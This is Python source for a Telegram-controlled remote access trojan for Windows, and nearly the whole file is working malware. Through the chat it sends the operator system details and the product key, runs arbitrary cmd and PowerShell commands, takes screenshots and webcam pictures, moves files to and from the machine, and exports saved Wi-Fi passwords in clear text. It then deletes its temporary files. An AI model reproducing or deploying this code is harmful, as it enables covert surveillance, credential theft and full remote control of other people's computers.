# Coded by FebVeg
# Version of Bot = 1.2

import telebot
from telebot import apihelper
import os
import platform
import pyscreenshot
import subprocess
import cv2
from time import strftime, sleep
import requests

while True:
    try:
        #print("[+] Checking proxy authentication...")
        #apihelper.proxy = {'https':'https://user:pass@proxy:port'}

        bot = telebot.TeleBot("your api token")
        ID = your id

        print("[BOT] Getting informations...")
        username = os.getlogin()
        windows_info = platform.platform()
        startup_folder = "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" % (username)
        localappdata = "C:\\Users\\%s\\AppData\\Local\\" % (username)
        roamingappdata = "C:\\Users\\%s\\AppData\\Roaming\\" % (username)
        default_path = os.getcwd()
        RAT_path = os.path.dirname(os.path.abspath(__file__)) + "\\"

        print("[BOT] Trying to send a message to BOT...")
        try:
            bot.send_message(ID, 'Computer Online!\n\nUsername: %s\nOS: %s\n\nPress /help for get command informations' % (username, windows_info))
        except Exception as intro_err:
            print(intro_err)

        def logs(message):
            user_name = message.chat.username
            user_id = message.chat.id
            user_cmd = message.text
            print("\n=========== LOG ===========")
            data = "Datetime: %s\nUsername: %s\nID: %s\nInput: %s" % (strftime("%d/%m/%y %H:%M:%S"), user_name, user_id, user_cmd)
            print(data)
            data_file = open("BOT_logs.log", "a")
            data_file.write(data)
            data_file.close()
            
        print("[BOT] Well done.. Listening for commands...")

        """
        @bot.message_handler(func=lambda m: True)
        def echo_all(message):
            bot.reply_to(message, message.text)
        """

        @bot.message_handler(commands=['start'])
        def start_bot(message):
            logs(message)
            if message.chat.id == ID:
                bot.send_message(ID, "Remote Bot Tool coded by FebVeg")
                bot.send_message(ID, "Use /help to see all commands")
            else:
                un_chat_id = message.chat.id
                un_chat_username = message.chat.username
                bot.send_message(un_chat_id, "Unauthorized")
                bot.send_message(ID, "USER NOT AUTHORIZED FOUND\nID: %s\nUsername: %s" % (un_chat_id, un_chat_username))

        @bot.message_handler(commands=['help'])
        def send_welcome(message):
            logs(message)
            if message.chat.id == ID:
                bot.send_message(ID, """
Command Prompt > /cmd 
Powershell > /ps
Run a file > /run_file
Send a message pop-up > /message

Download or Upload any file >
/download - /download_all - /upload

Get a screenshot > /screenshot
Get a picture from webcam > /snapshot
Get an audio from mic > /rec_mic
Get public IP > /get_ip

Get all wifi password saved > /wifipass
Get TREE structure of a folder > /getTree
Get informations about target > /targetInfo
Get System informations > /systemInfo
Get list of RAT dirs > /listdir""")
            else:
                un_chat_id = message.chat.id
                un_chat_username = message.chat.username
                bot.send_message(un_chat_id, "Unauthorized")
                bot.send_message(ID, "USER NOT AUTHORIZED FOUND\nID: %s\nUsername: %s" % (un_chat_id, un_chat_username))

        @bot.message_handler(commands=["targetInfo"])
        def target_info(message):
            logs(message)
            if message.chat.id == ID:
                try:
                    uname = platform.uname()
                    product_key = os.popen("wmic path softwarelicensingservice get OA3xOriginalProductKey").read()
                    product_key = product_key.split(" ", 1)[1].strip()
                    info_output = f"""
=== Target Informations ===
Username: {username}
System: {uname.system}
Hostname: {uname.node}
Release: {uname.release}
Version: {uname.version}
Machine: {uname.machine}
Processor: {uname.processor}
Product Key: {product_key}"""
                    bot.reply_to(message, str(info_output))
                except Exception as info_err:
                    bot.reply_to(message, str(info_err))
            else:
                un_chat_id = message.chat.id
                un_chat_username = message.chat.username
                bot.send_message(un_chat_id, "Unauthorized")
                bot.send_message(ID, "USER NOT AUTHORIZED FOUND\nID: %s\nUsername: %s" % (un_chat_id, un_chat_username))

        @bot.message_handler(commands=["listdir"])
        def list_dir(message):
            logs(message)
            if message.chat.id == ID:
                try:
                    links = f"""
=== Path Links ===
AppData Local: {localappdata}\n
AppData Roaming: {roamingappdata}\n
StartUp Folder: {startup_folder}\n
Default Path: {default_path}\n
Path of RAT: {RAT_path}"""
                    bot.reply_to(message, str(links))
                except Exception as info_err:
                    bot.reply_to(message, str(info_err))
            else:
                un_chat_id = message.chat.id
                un_chat_username = message.chat.username
                bot.send_message(un_chat_id, "Unauthorized")
                bot.send_message(ID, "USER NOT AUTHORIZED FOUND\nID: %s\nUsername: %s" % (un_chat_id, un_chat_username))
            
        @bot.message_handler(commands=['cmd'])
        def console(message):
            logs(message)
            if message.chat.id == ID:
                if message.text == "/cmd":
                    bot.reply_to(message, "Help: /cmd <command>")
                else:
                    try:
                        elab_command = message.text.split(" ",1)[1]
                        output_command = os.popen(elab_command).read()
                        if len(output_command) > 4096:
                            for x in range(0, len(output_command), 4096):
                                bot.send_message(ID, output_command[x:x+4096])
                        else:
                            bot.send_message(ID, output_command)
                    except Exception as cmd_err:
                        bot.reply_to(message, str(cmd_err))
                        pass
            else:
                un_chat_id = message.chat.id
                un_chat_username = message.chat.username
                bot.send_message(un_chat_id, "Unauthorized")
                bot.send_message(ID, "USER NOT AUTHORIZED FOUND\nID: %s\nUsername: %s" % (un_chat_id, un_chat_username))

        @bot.message_handler(commands=['ps'])
        def powershell_console(message):
            logs(message)
            if message.chat.id == ID:
                if message.text == "/ps":
                    bot.reply_to(message, "Help: /ps <command>")
                else:
                    try:
                        elab_command = message.text.split(" ",1)[1]
                        powershell_output = subprocess.Popen(["powershell", elab_command], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE , encoding="UTF-8")
                        if len(powershell_output.communicate()[0]) > 4096:
                            for x in range(0, len(powershell_output.communicate()[0]), 4096):
                                bot.send_message(ID, powershell_output.communicate()[0][x:x+4096])
                        else:
                            bot.reply_to(message, powershell_output.communicate()[0])
                    except Exception as cmd_err:
                        bot.send_message(ID, str(cmd_err))
                        pass
            else:
                un_chat_id = message.chat.id
                un_chat_username = message.chat.username
                bot.send_message(un_chat_id, "Unauthorized")
                bot.send_message(ID, "USER NOT AUTHORIZED FOUND\nID: %s\nUsername: %s" % (un_chat_id, un_chat_username))

        @bot.message_handler(commands=["get_ip"])
        def get_public_ip(message):
            logs(message)
            if message.chat.id == ID:
                try:
                    url = 'https://ident.me'
                    r = requests.get(url)
                    bot.send_message(ID, str(r.text))
                except Exception as get_public_ip_err:
                    bot.reply_to(message, str(get_public_ip_err))
            else:
                un_chat_id = message.chat.id
                un_chat_username = message.chat.username
                bot.send_message(un_chat_id, "Unauthorized")
                bot.send_message(ID, "USER NOT AUTHORIZED FOUND\nID: %s\nUsername: %s" % (un_chat_id, un_chat_username))

        @bot.message_handler(commands=["run_file"])
        def run_file(message):
            logs(message)
            if message.chat.id == ID:
                if message.text == "/run_file":
                    bot.reply_to(message, "Help: /run_file <path/file>")
                else:
                    try:
                        file_start = message.text.split(" ", 1)[1]
                        bot.reply_to(message, "Trying to run %s" % (file_start))
                        os.startfile(file_start)
                        bot.send_message(ID, "%s > Runned" % (file_start))
                    except Exception as file_start_err:
                        bot.send_message(ID, str(file_start_err))
            else:
                un_chat_id = message.chat.id
                un_chat_username = message.chat.username
                bot.send_message(un_chat_id, "Unauthorized")
                bot.send_message(ID, "USER NOT AUTHORIZED FOUND\nID: %s\nUsername: %s" % (un_chat_id, un_chat_username))

        @bot.message_handler(commands=['message'])
        def message(message):
            logs(message)
            if message.chat.id == ID:
                if message.text == "/message":
                    bot.reply_to(message, "Help: /message _Hello %username%_", parse_mode="Markdown")
                else:
                    try:
                        message = message.text.split(' ', 1)[1]
                        os.system("msg * /v %s" % (message))
                        bot.send_message(ID, "Message: %s > completed" % (str(message)))
                    except Exception as msg_err:
                        bot.send_message(ID, str(msg_err))
                        pass
            else:
                un_chat_id = message.chat.id
                un_chat_username = message.chat.username
                bot.send_message(un_chat_id, "Unauthorized")
                bot.send_message(ID, "USER NOT AUTHORIZED FOUND\nID: %s\nUsername: %s" % (un_chat_id, un_chat_username))

        @bot.message_handler(commands=['screenshot'])
        def screenshot(message):
            logs(message)
            if message.chat.id == ID:
                bot.reply_to(message, "Taking screenshot..")
                try:
                    if os.path.exists("_screen_shot_.png"):
                        os.remove("_screen_shot_.png")
                    im = pyscreenshot.grab()
                    im.save('_screen_shot_.png')
                    bot.send_document(ID, open("_screen_shot_.png", "rb"))
                    os.remove("_screen_shot_.png")
                except Exception as scr_err:
                    bot.send_message(ID, str(scr_err))
            else:
                un_chat_id = message.chat.id
                un_chat_username = message.chat.username
                bot.send_message(un_chat_id, "Unauthorized")
                bot.send_message(ID, "USER NOT AUTHORIZED FOUND\nID: %s\nUsername: %s" % (un_chat_id, un_chat_username))

        @bot.message_handler(commands=["download"])
        def download_file(message):
            logs(message)
            if message.chat.id == ID:
                if message.text == "/download":
                    bot.reply_to(message, "Help: /download <path of file>")
                else:
                    try:
                        bot.send_message(ID, "Downloading file...")
                        message = message.text.split(' ', 1)[1]
                        bot.send_document(ID, open(message, "rb"))
                    except Exception as e:
                        bot.send_message(ID, str(e))
            else:
                un_chat_id = message.chat.id
                un_chat_username = message.chat.username
                bot.send_message(un_chat_id, "Unauthorized")
                bot.send_message(ID, "USER NOT AUTHORIZED FOUND\nID: %s\nUsername: %s" % (un_chat_id, un_chat_username))

        @bot.message_handler(commands=["download_all"])
        def donwload_all(message):
            logs(message)
            if message.chat.id == ID:
                if message.text == "/download_all":
                    bot.reply_to(message, "Help: /download_all <full path of files>")
                else:
                    download_file_path = message.text.split(" ", 1)[1] + "\\"
                    bot.reply_to(message, "Trying to get all files from %s..." % (download_file_path))
                    if os.path.isdir(download_file_path):
                        try:
                            for f in os.listdir(download_file_path):
                                if os.path.isfile(download_file_path+f):
                                    bot.send_document(ID, open(download_file_path + f, "rb"))
                            bot.send_message(ID, "All files are downloaded")
                        except Exception as download_all_err:
                            bot.reply_to(message, str(download_all_err))
                            pass
                    else:
                        bot.reply_to(message, "Folder not found or doesn't have read/write permissions")

        @bot.message_handler(commands=['upload'])
        def upload_file(message):
            logs(message)
            if message.chat.id == ID:
                if message.text == "/upload":
                    bot.reply_to(message, "Help: /upload <destination path>")
                else:
                    global destination_path
                    destination_path = message.text.split(" ", 1)[1]
                    bot.reply_to(message, "Destination path configured\nSend me any file\n\nNew Path is %s" % (destination_path))
            else:
                un_chat_id = message.chat.id
                un_chat_username = message.chat.username
                bot.send_message(un_chat_id, "Unauthorized")
                bot.send_message(ID, "USER NOT AUTHORIZED FOUND\nID: %s\nUsername: %s" % (un_chat_id, un_chat_username))

        @bot.message_handler(content_types=['document'])
        def uploading_file(message):
            logs(message)
            if message.chat.id == ID:
                try:
                    bot.send_message(ID, "Uploading...")
                    info_file = bot.get_file(message.document.file_id)
                    downloaded_file = bot.download_file(info_file.file_path)
                    src = destination_path + message.document.file_name
                    with open(src, 'wb') as new_file:
                        new_file.write(downloaded_file)
                    bot.send_message(ID, "File uploaded in %s" % (destination_path))
                except Exception as uploading_err:
                    bot.send_message(ID, str(uploading_err))
            else:
                un_chat_id = message.chat.id
                un_chat_username = message.chat.username
                bot.send_message(un_chat_id, "Unauthorized")
                bot.send_message(ID, "USER NOT AUTHORIZED FOUND\nID: %s\nUsername: %s" % (un_chat_id, un_chat_username))
                    
        @bot.message_handler(commands=["snapshot"])
        def snapshot_cam(message):
            logs(message)
            if message.chat.id == ID:
                bot.send_message(ID, "Trying to taking picture...")
                try:
                    cam = cv2.VideoCapture(0)
                    frame = cam.read()[1]
                    cv2.imwrite('img_snapsh0t.png', frame)
                    cv2.imshow("img1", frame)
                    cv2.destroyAllWindows()
                    bot.send_document(ID, open('img_snapsh0t.png', "rb"))
                    os.remove('img_snapsh0t.png')
                except Exception as snap_err:
                    bot.reply_to(message, str(snap_err))
            else:
                un_chat_id = message.chat.id
                un_chat_username = message.chat.username
                bot.send_message(un_chat_id, "Unauthorized")
                bot.send_message(ID, "USER NOT AUTHORIZED FOUND\nID: %s\nUsername: %s" % (un_chat_id, un_chat_username))

        @bot.message_handler(commands=["wifipass"])
        def get_wifi_passwords(message):
            logs(message)
            if message.chat.id == ID:
                bot.reply_to(message, "Elaboring request...")
                try:
                    new_dir = "C:\\Users\\%s\\Save_Wifi\\" % (username)
                    if not os.path.isdir(new_dir):
                        os.mkdir(new_dir)
                    os.system("netsh wlan export profile folder=%s key=clear > Nul" % (new_dir))

                    new_file = open("wifi_pass.txt", "a")
                    for dirName, subdirName, files in os.walk(new_dir):
                        for f in files:
                            elab = open(new_dir+f).readlines()
                            for line in elab:
                                line = line.strip()
                                if line.startswith("<name>"):
                                    ssid = line.replace("<name>", "")
                                    ssid = ssid.replace("</name>", "")
                                if line.startswith("<keyMaterial>"):
                                    password = line.replace("<keyMaterial>", "")
                                    password = password.replace("</keyMaterial>", "")
                                    new_file.write("SSID: " + ssid + " - Password: " + password + "\n")
                    new_file.close()

                    bot.send_message(ID, "Trying to sending file...")
                    bot.send_document(ID, open("wifi_pass.txt", "rb"))

                    for x in os.listdir(new_dir):
                        os.remove(new_dir+x)
                    os.removedirs(new_dir)
                    os.remove("wifi_pass.txt")
                    bot.send_message(ID, "Temporaly files are destroyed")
                except Exception as get_wifi_error:
                    bot.reply_to(message, str(get_wifi_error))
                    pass
            else:
                un_chat_id = message.chat.id
                un_chat_username = message.chat.username
                bot.send_message(un_chat_id, "Unauthorized")
                bot.send_message(ID, "USER NOT AUTHORIZED FOUND\nID: %s\nUsername: %s" % (un_chat_id, un_chat_username))


        @bot.message_handler(commands=['getTree'])
        def tree(message):
            logs(message)
            if message.chat.id == ID:
                if message.text == "/getTree":
                    bot.reply_to(message, "Help /getTree <directory>")
                else:
                    tree_dir = message.text.split(" ", 1)[1]
                    bot.reply_to(message, "Trying to get structure of %s..." % (tree_dir))
                    try:
                        if os.path.exists("tree_export.txt"):
                            os.remove("tree_export.txt")
                        os.system("tree %s /A /F > tree_export.txt" % (tree_dir))
                        bot.send_document(ID, open("tree_export.txt", "rb"))
                        os.remove("tree_export.txt")
                    except Exception as tree_err:
                        bot.reply_to(message, str(tree_err))
            else:
                un_chat_id = message.chat.id
                un_chat_username = message.chat.username
                bot.send_message(un_chat_id, "Unauthorized")
                bot.send_message(ID, "USER NOT AUTHORIZED FOUND\nID: %s\nUsername: %s" % (un_chat_id, un_chat_username))

        @bot.message_handler(commands=['systemInfo'])
        def system_info(message):
            logs(message)
            if message.chat.id == ID:
                bot.reply_to(message, "Trying to get informations...")
                try:
                    if os.path.exists("system_informations.txt"):
                        os.remove("system_informations.txt")
                    os.system("systeminfo > system_informations.txt")
                    bot.send_document(ID, open("system_informations.txt", "rb"))
                    os.remove("system_informations.txt")
                except Exception as tree_err:
                    bot.reply_to(message, str(tree_err))
            else:
                un_chat_id = message.chat.id
                un_chat_username = message.chat.username
                bot.send_message(un_chat_id, "Unauthorized")
                bot.send_message(ID, "USER NOT AUTHORIZED FOUND\nID: %s\nUsername: %s" % (un_chat_id, un_chat_username))

        bot.polling(none_stop=False, interval=0, timeout=20)
    except KeyboardInterrupt:
        print("Exiting..")
        exit()
    except Exception as ENVERROR:
        print(ENVERROR)
        sleep(20)